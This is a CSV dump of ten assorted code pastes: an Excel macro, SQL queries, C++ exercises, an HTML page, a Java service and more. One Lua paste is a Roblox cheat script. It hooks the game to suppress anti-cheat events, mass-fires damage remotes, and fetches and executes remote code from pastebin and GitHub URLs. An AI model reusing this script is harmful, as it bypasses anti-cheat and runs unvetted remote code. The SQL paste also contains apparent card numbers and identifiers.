id,title,username,language,date,content
j7dXiKCq,27,ayiemedia,VBScript,Thursday 27th of July 2023 06:56:55 AM CDT,"Sub TransferData()
    Dim mainSheet As Worksheet
    Dim destSheet As Worksheet
    Dim lastRow As Long
    Dim i As Long
    
    Set mainSheet = ThisWorkbook.Worksheets(""Main"")
    
    ' Loop through each district sheet and clear its data
    For Each destSheet In ThisWorkbook.Worksheets
        If destSheet.Name <> ""Main"" And destSheet.Name <> ""Districts"" Then
            destSheet.Cells.ClearContents
        End If
    Next destSheet
    
    lastRow = mainSheet.Cells(mainSheet.Rows.Count, ""A"").End(xlUp).Row
    
    ' Loop through the rows in the main sheet and transfer data to the respective district sheets
    For i = 2 To lastRow ' Assuming your data starts from row 2, change if necessary
        Dim district As String
        district = mainSheet.Cells(i, ""E"").Value ' Assuming the district column is column ""E,"" change if necessary
        
        ' Find the respective district sheet and transfer the row data
        On Error Resume Next
        Set destSheet = ThisWorkbook.Worksheets(district)
        On Error GoTo 0
        
        ' If the district sheet is found, transfer the row data
        If Not destSheet Is Nothing Then
            lastRow = destSheet.Cells(destSheet.Rows.Count, ""A"").End(xlUp).Row
            destSheet.Rows(lastRow + 1).Value = mainSheet.Rows(i).Value
        End If
    Next i
End Sub
"
MF13tbCz,Untitled,fdevibe,YAML,Thursday 27th of July 2023 06:49:47 AM CDT,"/usr/local:
  archive.extracted:
    - source: https://foo.bar/sha256:{{ version }}
    - source_hash: sha256={{ version }}
    - archive_format: tar
    - require
      - system.dead
      	- name foobard.service
"
XLQH99Tj,query debugging cancellation,Alimin1313,PostgreSQL,Thursday 27th of July 2023 06:17:17 AM CDT,"select
	cancellation.*,
	bank.bank_name,
	bank.product_name,
	card.name_type as card_type_name,
	terminal.terminal_name,
	terminal_type.terminal_type_name,
	station.station_name,
	registration.name as nama,
	registration.nik as nik,
	cancellation.user_id as petugas
from
	trx.t_trx_subs_card_cancellation cancellation
left join master.t_mtr_bank bank on
	bank.bank_code = cancellation.card_issuer
left join master.t_mtr_station station on
	cancellation.station_code = station.station_id
left join master.t_mtr_device_terminal terminal on
	terminal.terminal_code = cancellation.terminal_code
left join master.t_mtr_device_terminal_type terminal_type on
	terminal.terminal_type = terminal_type.terminal_type_code
left join master.t_mtr_subs_card_registration registration on
	registration.uid = cancellation.uid
	and registration.card_number = cancellation.card_number
	and registration.status = 1
left join master.t_mtr_subs_card_type card on
	card.subs_card_type_id = cancellation.card_type
where
	cancellation.status = 1
	and card.subs_card_type_id = '11'
	and (DATE(cancellation.created_on) between '2023-07-23' and '2023-07-27' )
union 
                select
	cancellation.*,
	bank.bank_name,
	bank.product_name,
	card.name_type as card_type_name,
	terminal.terminal_name,
	terminal_type.terminal_type_name,
	station.station_name,
	registration.name as nama,
	registration.nik as nik,
	cancellation.user_id as petugas
from
	trx.t_trx_subs_card_cancellation cancellation
left join master.t_mtr_bank bank on
	bank.bank_code = cancellation.card_issuer
left join master.t_mtr_station station on
	cancellation.station_code = station.station_id
left join master.t_mtr_device_terminal terminal on
	terminal.terminal_code = cancellation.terminal_code
left join master.t_mtr_device_terminal_type terminal_type on
	terminal.terminal_type = terminal_type.terminal_type_code
left join master.t_mtr_family_trip_registration registration on
	registration.uid = cancellation.uid
	and registration.card_number = cancellation.card_number
	and registration.status = 1
left join master.t_mtr_subs_card_type card on
	card.subs_card_type_id = cancellation.card_type
where
	cancellation.status = 1
	and card.subs_card_type_id = '11'
	and (DATE(cancellation.created_on) between '2023-07-23' and '2023-07-27' )
	
	select * from trx.t_trx_subs_card_cancellation ttscc 
	left join master.t_mtr_family_trip_registration tmftr 
	on ttscc.card_number =tmftr.card_number  and ttscc.uid = tmftr.uid
	where ttscc.card_number ='7546800002265691' and tmftr.uid ='A717666D'
	
	
	select * from trx.t_trx_subs_card_cancellation ttscc where card_number ='7546800002265691' and uid='A717666D';
	--select * from master.t_mtr_subs_card_registration where uid='3175D415' and nik ='7546800000089580';
	select * from master.t_mtr_family_trip_registration tmftr where uid='A717666D' and card_number  ='7546800002265691'
	
	select * from master.t_mtr_family_trip_registration tmftr where uid='A717666D' and card_number  ='7546800002265691'"
ZDmzuwc2,Iterators,LEGEND2004,C++,Thursday 27th of July 2023 06:17:08 AM CDT,"#include <bits/stdc++.h>
using namespace std;

signed main()
{
    vector<int> v = {5 , 6 , 7 , 8};

    cout << *v.begin() << endl; // 5
    cout << *v.end() << endl; //random number
    cout << *(--v.end()) << endl; //8
    cout << *(v.end()--) << endl; // random number
    cout << *(v.begin()++) << endl; // 5
    cout << *(++v.begin()) << endl; // 6
    cout << *(v.begin() + 2) << endl; // number in 2-nd index
    sort(v.begin() , v.end());
    cout << *(lower_bound(v.begin() , v.end() , 7)) << endl; // 7
    cout << *(upper_bound(v.begin() , v.end() , 7)) << endl; // 8
    cout << *(upper_bound(v.begin() , v.end() , 8)) << endl; // random number

    auto it = v.begin();
    cout << *it << endl; // 5
    vector<int>::iterator pt = v.end();
    pt--;
    cout << *pt << endl; // 8
}
"
Xk6Hx78d,data646,TestGuy1,JSON,Thursday 27th of July 2023 06:13:16 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '6ff8b7697f82fd87780600578df98fb519f9bceb21fb77aa6d31d8b1b7939235089e9a563a9d01702d868b498970269b870413f7442865cc56c383c3ae810817cf4e2c3c0617b529721b111a97e86ba43dbd65ec13ac14e454f98b4a0fa34afacddcb46da1e29b5ef8d03feadb45cef5eb720c0fdcff8e2e7197278150d80f23',
  otherdata: [
    '868caec86acdac5c909d6168a492b1e4',
    'c34b7f0a3aba1302f311b898ff1ae571',
    'f4ff4b719287bdc816596399dde64899',
    '9ff30fd0b026f9abae3b3c09e8fb9d73',
    '1d8a2a68e468432bdd914ef20dce9c8f',
    'd0cd9f37ad3f052037e1f9e8d91ef871',
    'e6ed40864c8138ea164b0d555734af3d',
    '932a1f9d84837886c677ab92a82b10f4'
  ]
}"
EUsDV79p,I - Binary search - 1,LEGEND2004,C++,Thursday 27th of July 2023 05:59:07 AM CDT,"#include <bits/stdc++.h>
using namespace std;

signed main()
{
    int n , q , x;
    cin >> n >> q;
    vector<int> a(n);
    for(int i = 0; i < n; i++)
        cin >> a[i];

    sort(a.begin() , a.end()); // O(n logn)

    while(q--){
        cin >> x;
        auto e = equal_range(a.begin() , a.end() , x);
        cout << e.second - e.first << endl;
/*
        int l = lower_bound(a.begin() , a.end() , x) - a.begin();
        int r = upper_bound(a.begin() , a.end() , x) - a.begin();
        cout << (r - l) << endl;*/
    }
}
"
pvaqYEeE,webpage2,Dynamic_Fantasy,CSS,Thursday 27th of July 2023 05:50:50 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Technologies We Are Using | Antivirus Website</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #1A1A1A;
            color: #FF7597;
        }
        h1{
            color:whitesmoke
        }

        header {
            background-color: #BB86FC;    
            padding: 20px;
            text-align: center;
        }

        .technology-section {
            max-width: 800px;
            margin: 30px auto;
            padding: 30px;
        }

        .technology-title {
            font-size: 36px;
            margin-bottom: 20px;
            text-align: center;
        }

        .technology-boxes {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 30px;
        }

        .technology-box {
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
            width: 250px;
            color: #f2ebeb;
        }
        

        .technology-box img {
            max-width: 100%;
            border-radius: 5px;
            margin-bottom: 15px;
        }

        .technology-box h2 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        .technology-box p {
            font-size: 16px;
            line-height: 1.6;
        }
        .cta-button {
            background-color: #871bec;
            color: #fff;
            border: none;
            border-radius: 5px;
            padding: 10px 20px;
            font-size: 18px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s ease;
        }

        .cta-button:hover {
            background-color: #9603a3;
        }

        .footer {
            background-color: #2b2b2b;
            color: #fff;
            text-align: center;
            padding: 10px;
        }
    </style>
</head>
<body>
    <header>
        <h1>Antivirus Website</h1>
    </header>

    <div class=""technology-section"">
        <!-- Frontend Section -->
        <h2 class=""technology-title"">FRONTEND</h2>
        <div class=""technology-boxes"">
            <div class=""technology-box"">
                <img src=""frontend_html.gif"" alt=""HTML"">
                <h2>HTML</h2>
                <p>HTML provides the structure and content of our web pages.</p>
            </div>

            <div class=""technology-box"">
                <img src=""frontend_css.gif"" alt=""CSS"">
                <h2>CSS</h2>
                <p>CSS adds style and presentation to our web pages.</p>
            </div>

            <div class=""technology-box"">
                <img src=""frontend_js.gif"" alt=""JavaScript"">
                <h2>JavaScript</h2>
                <p>JavaScript makes our web pages interactive and dynamic.</p>
            </div>

            <div class=""technology-box"">
                <img src=""frontend_react.gif"" alt=""React"">
                <h2>React</h2>
                <p>React is used to build fast and scalable user interfaces.</p>
            </div>
        </div>

        <!-- Backend Section -->
        <h2 class=""technology-title"">BACKEND</h2>
        <div class=""technology-boxes"">
            <div class=""technology-box"">
                <img src=""backend_django.gif"" alt=""Django"">
                <h2>Django</h2>
                <p>Django is a powerful framework for building secure and maintainable backend applications.</p>
            </div>

            <div class=""technology-box"">
                <img src=""backend_js.gif"" alt=""JavaScript"">
                <h2>JavaScript</h2>
                <p>JavaScript enables server-side scripting and backend development.</p>
            </div>
        </div>

        <!-- Machine Learning Section -->
        <h2 class=""technology-title"">MACHINE LEARNING</h2>
        <div class=""technology-boxes"">
            <div class=""technology-box"">
                <img src=""ml_placeholder.gif"" alt=""Machine Learning"">
                <h2>Machine Learning</h2>
                <p>Our Machine Learning section is under development, bringing AI-powered security features.</p>
                <button class=""cta-button"">Coming Soon!</button>
            </div>

        </div>
    </div>

    <footer class=""footer"">
    </footer>
</body>
</html>
"
xyYwpFw2,problem code,ZergRushA,C++,Thursday 27th of July 2023 05:39:23 AM CDT,"#include <iostream>
#include <algorithm>
#include <string>
#include <map>
#include <random>
using namespace std;
 
std::random_device dev;
std::mt19937 rng(dev());
const std::string nulls = ""ABCDEFGHIJKLMNOPQRSTUVWXYZ"";
std::uniform_int_distribution<std::mt19937::result_type> dist_nulls(0, nulls.length()-1);
 
std::string key = ""ZEBRAS"";
std::map<int, int> key_order;
 
    void set_permutation_order(){
        for(int i = 0; i < key.length(); ++i)
            key_order[key[i]] = i;
    }
 
    void normalize(std::string& str){
        str.erase(std::remove_if(str.begin(), str.end(), ::isspace), str.end());
        std::transform(str.begin(), str.end(), str.begin(), ::toupper);
    }
 
    std::string columnar_transpos_encrypt(std::string msg){
        
        normalize(msg);
        //std::cout << msg << '\n';
        int cols = key.length();
        int rows = msg.length()/cols;
 
        if(msg.length() % cols)
            ++rows;
        
 
        char** matrix = new char*[rows];
        for(int i = 0; i < rows; ++i)
            matrix[i] = new char[cols];
        
 
        int ind{0};
        for(int row = 0; row < rows; ++row){
            for(int col = 0; col < cols; ++col){
                if(ind >= msg.length())
                    matrix[row][col] = nulls[dist_nulls(rng)];
                else
                    matrix[row][col] = msg[ind++];
            }
        }
        
        //std::cout << rows << "" "" << cols << '\n';
        std::string encrypted{};
        int col_order{};
        for(auto it = key_order.begin(); it != key_order.end(); ++it){
            col_order = it->second;
            for(int row = 0; row < rows; ++row){
                encrypted += matrix[row][col_order];
            }
        }
        
        //for debug purpose
        
        for(int row = 0; row < rows; ++row){
            for(int col = 0; col < cols; ++col){
                std::cout << matrix[row][col] << ' ';
            }
            std::cout << '\n';
        }
        
        
        for(int i = 0; i < rows; ++i)
            delete[] matrix[i];
        delete[] matrix;
 
        return encrypted;
 
    }

std::string columnar_transpos_decrypt(std::string& ciphered){
        
        int cols = key.length();
        int rows = ciphered.length()/cols;
        
        char** matrix = new char*[rows];
        for(int i = 0; i < rows; ++i)
            matrix[i] = new char[cols];
        
        std::cout << cols << "" cols "" << rows << "" rows\n"";
        
        std::string sorted_key = key;
        std::sort(sorted_key.begin(), sorted_key.end());
        //тут начинаются странности
        int ind{0};
        for(const char& ch: sorted_key){
            int col = key.find(ch);
            for(int j = 0; j < rows; ++j){
                std::cout << ciphered[ind]; //для проверки того, действительно
                                            //индекс идет по всей строке
                matrix[j][col] = ciphered[ind++];
                
            }
        }
        
        std::cout << ""\n"";
        //здесь видно, что матрица заполняется не полностью, хотя должна быть 6х5
        for(int i = 0; i < cols; ++i){
            for(int j = 0; j < rows; ++j){
                std::cout << matrix[i][j] << ' ';
            }
            std::cout << '\n';
        }
        
        
        /*
        std::string sorted_key = key;
        std::sort(sorted_key.begin(), sorted_key.end());
        
        int index{0};
        for(const auto& ch: sorted_key){
            //при заполнении проходит по sorted_key
            //и находит индекс элемента sorted_key
            //в строке key
            int right_col = key.find(ch);
            for(int row = 0; row < rows; ++row){
                matrix[row][right_col] = ciphered[++index];
            }
        }
        
        for(int col = 0; col < cols; ++col){
            for(int row = 0; row < rows; ++row){
                std::cout << matrix[row][col] << "" "";
            }
            std::cout << '\n';
        }
        
        std::string deciphered{};
        int str_len{0};
        for(int row = 0; row < rows; ++row){
            for(int col = 0; col < cols; ++col){
                deciphered += matrix[row][col];
            }
        }
        
        */
        std::string deciphered{};
        for(int i = 0; i < rows; ++i)
            delete[] matrix[i];
        delete[] matrix;
        
        return deciphered;
    }
 
int main()
{
    std::string ms = ""We are discovered flee at once"";
    set_permutation_order();
    std::string res = columnar_transpos_encrypt(ms);
    std::cout << ""Ciphered: "" << res << '\n';
    std::cout << columnar_transpos_decrypt(res);
    return 0;
}"
YbZA2baD,Sword Warriors!,LuaXe,Lua,Thursday 27th of July 2023 05:37:57 AM CDT,"if game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame:FindFirstChild(""Donate"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame.Donate:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame:FindFirstChild(""NewBundle"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.MenuFrame.NewBundle:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""Invite"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.Invite:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""AutoF"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.AutoF:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""SlashClick"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.SlashClick:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""PlusFrame"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.PlusFrame:Destroy() end
if game.Players.asyesast.PlayerGui.MainGui.MainFrame:FindFirstChild(""Shift"") then game.Players.asyesast.PlayerGui.MainGui.MainFrame.Shift:Destroy() end

local mt = getrawmetatable(game) make_writeable(mt)
local nc = mt.__namecall

mt.__namecall = newcclosure(function (self, ...)
local method = getnamecallmethod()
local args = {...}

if method == ""FireServer"" and args[1] == ""HackCheck"" and tostring(self) == ""MonsterEvent"" then return end
if method == ""FireServer"" and args[1] == ""PlayServerAni"" and tostring(self) == ""MonsterEvent"" then return end

return nc(self, table.unpack(args))
end)

function C() spawn(function () while getgenv().C do
    for i, v in pairs(workspace.ForScript.Monster:GetDescendants()) do
        if v:FindFirstChild(""Monster_"") then
            for i, v in pairs(v.Monster_:GetChildren()) do
                if v then local args = {[1] = ""DamToMonster"",[2] = v,[3] = {[""damtype""] = ""normal""}}game:GetService(""ReplicatedStorage"").CurRemotes.MonsterEvent:FireServer(unpack(args)) end
            end
        end
    end wait()
        end
    end)
end

local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()

local w = library:CreateWindow(""Sword Warriors!"")

local b = w:CreateFolder(""Main"")

b:Label(""God Mode is Always On"",{TextSize = 20; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

b:Toggle(""Instant Kill/Inf. Level"",function(val) getgenv().C = val C() end)

b:Label(""Made by X_LuaF#0705"",{TextSize = 21; TextColor = Color3.fromRGB(255,255,255); BgColor = Color3.fromRGB(38, 38, 38);})

local w = library:CreateWindow(""LocalPlayer"")

local b = w:CreateFolder(""LP"")

b:DestroyGui()

b:Button(""Discord"",function() setclipboard(""workink.co/2GQ/LTD"") end)
b:Button(""Full Version"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/GphZf9Xe"", true))() end)
b:Button(""Rejoin"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/mM7JBG5h"", true))() end)
b:Button(""Reset"",function() loadstring(game:HttpGet(""https://pastebin.com/raw/EEY6SATj"", true))() end)

b:Slider(""WalkSpeed"",{min = 0; max = 100000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val end)
b:Slider(""JumpPower"",{min = 0; max = 100000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.JumpPower = val end)
b:Slider(""HipHeight"",{min = 0; max = 100000; precise = false;},function(val) game.Players.LocalPlayer.Character.Humanoid.HipHeight = val end)
b:Slider(""Gravity"",{min = 0; max = 360; precise = false;},function(val) game.workspace.Gravity = val end)
b:Slider(""FOV"",{min = 0;max = 120;precise = false;},function(val) game.workspace.CurrentCamera.FieldOfView = val end)

function TPCFrame(Player_CFrame) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player_CFrame end end
function RTPCFrame(M_CF) if game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"") then M_CF.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end end
function PHP(Player_HP) if game.Players.LocalPlayer.Character:FindFirstChild(""Humanoid"") then game.Players.LocalPlayer.Character.Humanoid.Health = Player_HP end end"
g0feSims,PartsServiceImpl,Nikola_944,Java,Thursday 27th of July 2023 05:18:53 AM CDT,"package softuni.exam.service.impl;

import com.google.gson.Gson;
import org.modelmapper.ModelMapper;
import org.springframework.stereotype.Service;
import softuni.exam.models.dto.PartDto;
import softuni.exam.models.entity.Part;
import softuni.exam.repository.PartsRepository;
import softuni.exam.service.PartsService;
import softuni.exam.util.ValidationUtil;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;


@Service
public class PartsServiceImpl implements PartsService {

    private static String PARTS_FILE_PATH = ""src/main/resources/files/json/parts.json"";

    private PartsRepository partsRepository;
    private ValidationUtil validationUtil;
    private ModelMapper modelMapper;
    private Gson gson;


    public PartsServiceImpl(PartsRepository partsRepository, ValidationUtil validationUtil, ModelMapper modelMapper, Gson gson) {
        this.partsRepository = partsRepository;
        this.validationUtil = validationUtil;
        this.modelMapper = modelMapper;
        this.gson = gson;
    }


    @Override
    public boolean areImported() {
        return partsRepository.count() > 0;
    }

    @Override
    public String readPartsFileContent() throws IOException {
        return Files.readString(Path.of(PARTS_FILE_PATH));
    }

    @Override
    public String importParts() throws IOException {

        String fileInput = readPartsFileContent();

        List<PartDto> partDtos = Arrays.stream(gson.fromJson(fileInput, PartDto[].class))
                .collect(Collectors.toList());

        StringBuilder sb = new StringBuilder();

        for (PartDto partDto : partDtos) {
            Optional<Part> partInDb = partsRepository.findFirstByPartName(partDto.getPartName());

            if(!validationUtil.isValid(partDto) || partInDb.isPresent()){
                sb.append(""Invalid part"").append(System.lineSeparator());
                continue;
            }

            Part part = modelMapper.map(partDto, Part.class);
            partsRepository.save(part);

            sb.append(String.format(""Successfully imported part %s - %s"",
                    part.getPartName(), part.getPrice())).append(System.lineSeparator());

        }

        return sb.toString().trim();
    }
}"
